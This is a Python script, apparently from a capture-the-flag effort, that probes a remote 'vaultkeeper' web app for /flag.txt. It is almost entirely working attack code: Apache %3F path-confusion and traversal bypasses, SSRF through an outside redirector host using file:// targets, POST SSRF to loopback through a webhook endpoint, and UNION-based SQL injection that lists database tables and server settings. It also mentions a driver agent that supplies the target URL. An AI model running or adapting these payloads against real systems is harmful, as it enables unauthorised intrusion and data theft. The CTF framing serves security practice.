#!/usr/bin/env python3
"""
Angle 3 batched remote probe: reach /flag.txt without ever learning cap.mask.
Rehearsed offline against the local handout container first. One or two requests
a test, best-first, 16 in the default batch, 0.6 s apart.
    probe_remote_angle3.py                 polls ctf-tools/VK-BASE.txt
    probe_remote_angle3.py --base http://host
    probe_remote_angle3.py --only A,B,D    a subset, in a short window
    probe_remote_angle3.py --list
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE_FILE = os.path.expanduser("~/ctf-tools/VK-BASE.txt")
DEFAULT_REDIR = "https://jan-pharmaceuticals-object-representatives.trycloudflare.com"
PACE = 0.6
_last = [0.0]
REQS = [0]


# ----------------------------------------------------------------- plumbing
def _pace():
    dt = time.time() - _last[0]
    if dt < PACE:
        time.sleep(PACE - dt)
    _last[0] = time.time()


def req(url, data=None, ctype="application/json", timeout=20):
    _pace()
    REQS[0] += 1
    headers = {"User-Agent": "Mozilla/5.0"}
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = ctype
    r = urllib.request.Request(url, data=body, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"ERR {e!r}"


def one(label, code, body, n=220):
    flat = " ".join(body.split())
    print(f"  {label:<48s} {code:>3} {flat[:n]}")
    hit_flag(body)


FLAG_RE = re.compile(r"TFC\{[^}]{0,200}\}")


def hit_flag(s):
    m = FLAG_RE.search(s)
    if m:
        print("\n" + "!" * 70)
        print("FLAG:", m.group(0))
        print("!" * 70 + "\n")
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "FLAG_FOUND.txt"), "a") as fh:
            fh.write(m.group(0) + "\n")


def ssrf(base, redir, target):
    """GET SSRF: fetch_source through the Apache ACL bypass, 418 + Location.

    solve/redir.py echoes everything after /r/ RAW into the Location header, so
    the target must NOT be percent-encoded here.
    """
    inner = redir.rstrip("/") + "/r/" + target
    return req(base + "/api/fetch_source.php%3Fa.php?url=" + urllib.parse.quote(inner, safe=""))


def wh(base, url, event="backup.failed"):
    """POST SSRF via webhook_test. Returns status + byte length of the response."""
    return req(base + "/api/webhook_test.php%3Fa.php", {"url": url, "event": event})


def sqli(base, filter_sql):
    return req(base + "/api/query.php?filter=" + urllib.parse.quote(filter_sql, safe=""))


# --------------------------------------------------- offline cap verifier
def verify_cap_key(read_capability_b64: str, key: bytes) -> bool:
    """Zero-request check. Decrypt /api/status.php read_capability with `key`.

    Plaintext must be exactly b'viewer          '. Validated against the local
    container in an earlier session.
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        print("  (install cryptography to use verify_cap_key)")
        return False
    raw = base64.b64decode(read_capability_b64)
    nonce, ct, tag = raw[:12], raw[12:28], raw[28:44]
    try:
        return AESGCM(key).decrypt(nonce, ct + tag, b"") == b"viewer          "
    except Exception:  # noqa: BLE001
        return False


# ------------------------------------------------------------------ tests
def test_A(base, redir):
    print("\n[A] Apache %3F confusion aimed at /flag.txt "
          "(handout gives php-fpm '403 Access denied.')")
    for p in ["/flag.txt%3Fa.php",
              "/api/%2e%2e/flag.txt%3Fa.php",
              "/api/%2e%2e/%2e%2e/flag.txt%3Fa.php",
              # is the deployed DocumentRoot /var/www/html rather than
              # /var/www/html/public, or is /var/www/private aliased in?
              "/private/cap.mask",
              "/flag.txt",
              "/api/%2e%2e/private/cap.mask%3Fa.php"]:
        c, b = req(base + p)
        one(p, c, b, 140)
    print("   read: '403 Access denied.' = limit_extensions active, docroot confined -> CLOSED")
    print("         Apache 400 HTML       = URI escapes the root -> CLOSED")
    print("         anything else         = the deployed vhost differs, DIG IN")


def test_B(base, redir):
    print("\n[B] /api/diag.php schemas. handout: vaultkeeper=[jobs,schedules] "
          "vk_restore=[catalog]. ANY extra table is the deployed unseal state.")
    c, b = req(base + "/api/diag.php")
    try:
        j = json.loads(b)
        print("  schemas:", json.dumps(j.get("schemas"), separators=(",", ":")))
        print("  runtime:", json.dumps(j.get("runtime"), separators=(",", ":"))[:300])
    except Exception:  # noqa: BLE001
        one("diag.php", c, b, 400)


def test_C(base, redir):
    print("\n[C] /api/replica.php manifest: vk_restore tables with row counts")
    c, b = req(base + "/api/replica.php")
    one("replica.php", c, b, 400)


def test_D(base, redir):
    print("\n[D] webhook_test POST SSRF to loopback (status + LENGTH oracle)")
    c, b = wh(base, "http://127.0.0.2/api/status.php")
    one("127.0.0.2 /api/status.php  (bypass works?)", c, b)
    c, b = wh(base, "http://127.0.0.1/api/status.php")
    one("127.0.0.1 /api/status.php  (control, must refuse)", c, b)
    for path in ["/api/keyring.php",
                 "/api/vault_unseal.php",
                 "/api/vault_unseal.php?ref=" + os.environ.get("VK_UNSEAL_REF", "")]:
        c, b = wh(base, "http://127.0.0.2" + path, event="maintenance.x")
        one("POST 127.0.0.2 " + path, c, b)
    print("   read: a vault_unseal POST whose status/bytes differ from its GET means")
    print("         the deployed handshake has a POST branch nobody has reached.")


def test_E(base, redir):
    print("\n[E] fetch_source Location with a non-http scheme, on the DEPLOYED build")
    for t in ["file:///flag.txt", "file:///var/www/private/cap.mask"]:
        c, b = ssrf(base, redir, t)
        one(t, c, b, 200)
    print("   read: chain [418,418,418,...] = relative-path loop back to us -> CLOSED")


def test_F(base, redir):
    print("\n[F] php-fpm security.limit_extensions remotely (.phar IS allowed)")
    for p in ["/samples/demo-nightly.vkb%3Fa.php", "/assets/style.css%3Fa.php"]:
        c, b = req(base + p)
        one(p, c, b, 120)
    print("   read: '403 Access denied.' = limit_extensions active. Remember .phar")
    print("         executes, so any future docroot write only needs a .phar name.")


def test_G(base, redir):
    print("\n[G] query.php SQLi re-audit as vk_restore (UDF / FILE / visible schemas)")
    q1 = ("1=2 UNION SELECT 1,CONCAT_WS('|',user(),version(),"
          "IFNULL(@@secure_file_priv,'NULL'),IFNULL(@@plugin_dir,'NULL')),3,4-- ")
    c, b = sqli(base, q1)
    one("user/version/secure_file_priv/plugin_dir", c, b, 320)
    q2 = ("1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(DISTINCT CONCAT(table_schema,'.',table_name)) "
          "FROM information_schema.tables),3,4-- ")
    c, b = sqli(base, q2)
    one("every table vk_restore can see", c, b, 700)
    print("   read: a vaultkeeper.* table visible here means the deployed grants are")
    print("         wider than the handout's and the jobs table is directly writable.")


TESTS = {"A": test_A, "B": test_B, "C": test_C, "D": test_D,
         "E": test_E, "F": test_F, "G": test_G}


def wait_for_base(timeout=3600):
    t0 = time.time()
    shown = False
    while time.time() - t0 < timeout:
        if os.path.exists(BASE_FILE):
            v = open(BASE_FILE).read().strip().splitlines()
            v = [x.strip() for x in v if x.strip()]
            if v:
                return v[0]
        if not shown:
            print(f"[*] waiting for {BASE_FILE} (driver agent writes it)...")
            shown = True
        time.sleep(5)
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base")
    ap.add_argument("--redir", default=DEFAULT_REDIR)
    ap.add_argument("--only", default="A,B,C,D,E,F,G")
    ap.add_argument("--pace", type=float, default=0.6)
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()

    if a.list:
        print(__doc__)
        return

    globals()["PACE"] = a.pace

    base = a.base or wait_for_base()
    if not base:
        print("no base URL; pass --base or wait for the driver agent")
        sys.exit(1)
    base = base.rstrip("/")
    print(f"[*] base  {base}")
    print(f"[*] redir {a.redir}")

    for k in [x.strip().upper() for x in a.only.split(",") if x.strip()]:
        if k in TESTS:
            try:
                TESTS[k](base, a.redir)
            except Exception as e:  # noqa: BLE001
                print(f"  [{k}] blew up: {e!r}")
    print(f"\n[*] {REQS[0]} requests total")


if __name__ == "__main__":
    main()
